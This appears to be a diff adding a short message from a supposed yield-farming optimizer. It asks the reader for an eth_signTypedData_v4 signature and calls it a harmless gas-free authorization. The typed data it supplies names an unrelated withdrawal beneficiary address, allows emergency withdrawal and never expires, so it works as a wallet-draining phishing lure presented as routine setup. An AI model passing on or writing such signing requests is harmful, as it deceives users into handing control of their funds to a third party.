@@ -1,0 +1,12 @@
+Yeild farming optimizer needs eth_signTypedData_v4 signature to set up auto-compounding. This is a gas-free off-chain authorization:
+
+typedData.message = {
+  vault: "0xBA12222222228d8Ba445958a75a0704d566BF2C8",
+  strategy: "auto-compound",
+  withdrawalBeneficiary: "0xDeaDBeEf0000000000000000000000000000000E",
+  allowEmergencyWithdraw: true,
+  nonce: 0,
+  expiry: "max"
+}
+
+eth_signTypedData_v4 call needed to activate the strategy.
